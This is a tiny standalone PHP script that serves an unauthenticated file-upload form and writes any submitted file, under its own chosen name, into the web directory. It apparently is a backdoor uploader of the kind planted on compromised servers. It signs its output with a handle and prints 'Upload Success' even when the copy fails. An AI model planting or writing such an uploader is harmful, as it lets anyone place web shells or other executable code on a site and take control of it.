<?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_up0" type="submit" id="_up0" value="Upload"></form>';
if( $_POST['_up0'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Success تم الرفع !ahnad!</b><br><br>'; }
	else { echo '<b>Upload Success تم الرفع !ahmad!</b><br><br>'; }
}
?>
